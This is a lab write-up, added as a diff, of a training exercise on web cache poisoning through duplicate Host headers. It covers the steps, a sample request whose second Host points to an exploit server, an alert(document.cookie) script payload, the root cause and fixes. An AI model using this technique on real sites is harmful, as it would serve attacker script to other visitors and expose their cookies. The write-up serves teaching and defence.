@@ -1,0 +1,56 @@
+Lab: Web cache poisoning via ambiguous requests
+
+Difficulty: Practitioner
+Vulnerability: Web cache poisoning (ambiguous / duplicate Host headers)
+
+Summary
+
+Short version: the cache and the backend disagree about which Host value to trust. The cache will happily store a response that contains an attacker-controlled absolute URL (coming from a second Host header), and later visitors get that poisoned cached page — which lets the attacker run alert(document.cookie) in the victim’s browser.
+Pretty sneaky: nothing glaring on the front page, but the way headers are parsed between the cache and server is out of sync.
+
+Steps taken
+
+Opened the lab in Burp’s browser and clicked Home to get a fresh request/response for /.
+
+In Proxy > HTTP history, right-clicked the GET / entry and Send to Repeater to start poking.
+
+In Repeater I noticed the site validates the Host header — if I change the Host value, the site refuses to serve the home page. So direct host switching wasn’t working.
+
+Looked at the original response headers — lots of caching headers. The response also indicates cache hits and age, so I decided to use a cache-buster query param to force fresh responses from the backend when I wanted one. Example: GET /?cb=123. (I changed the number each time I wanted a guaranteed fresh fetch.)
+
+Experimented with adding a second Host header (duplicate Host:). The first Host: was the real lab host, the second I set to an arbitrary value. The backend still validated/routed using the first Host, but the second Host value was reflected verbatim inside an absolute URL in the HTML — specifically the import for /resources/js/tracking.js. Nothing blocked that reflection. Interesting.
+
+Sent the request with the second Host: set to some random domain — response contained that domain in the script URL. Then I removed the second Host header and re-requested the same /?cb=123 — the cached response still contained my injected host. That was the giveaway: the cache stored the response with the attacker-controlled absolute URL.
+
+Went to the exploit server and uploaded /resources/js/tracking.js containing alert(document.cookie). Saved it and copied the exploit server domain.
+
+Back in Repeater, added a second Host: header equal to my exploit server domain. Example request looked like:
+
+GET /?cb=123 HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
+
+
+Sent that a few times until the response was a cache hit and the HTML referenced the exploit server URL for /resources/js/tracking.js.
+
+To verify the victim scenario, I opened the lab’s home page in the browser using the same cache-buster (/?cb=123) and the alert(document.cookie) executed — success.
+
+Finally, removed cache-busters and replayed requests until the cache had the poisoned entry without any special params so an ordinary visitor would load the poisoned page. Lab solved when the victim visited the home page and the alert fired.
+
+Root cause
+
+The cache (or caching layer) and the backend application parse/handle ambiguous requests differently — specifically duplicate Host headers. The cache used the request and the response it received to build and serve cached pages, while the backend validated/routed based on the canonical Host. Because the application reflected the second Host header value into an absolute URL in the page, an attacker could get that reflected host stored in cache. Once cached, other users get served the poisoned HTML which references the attacker’s JS file.
+
+In short: untrusted header data (duplicate Host) was reflected into responses, and the cache stored that reflection — so later users executed attacker JS.
+
+Fixes and mitigation
+
+Don’t trust client-supplied Host values. Validate and canonicalize Host server-side and never reflect raw Host header values into HTML or absolute URLs.
+
+Ensure caches / CDNs and backend agree on which request fields are part of the cache key. If the Host header matters, the cache key must include it — and the cache should only be populated with responses that the backend explicitly authorized for that Host.
+
+Normalize incoming headers: strip duplicate headers (especially Host) at the edge, or reject requests that contain ambiguous/duplicate critical headers.
+
+Avoid generating absolute URLs in responses using raw header values. Instead build URLs using server-side configuration or a validated canonical host name.
+
+Add robust cache-control and Vary headers where appropriate, and make sure caching rules don’t allow storing responses that include reflected, user-controllable hostnames.
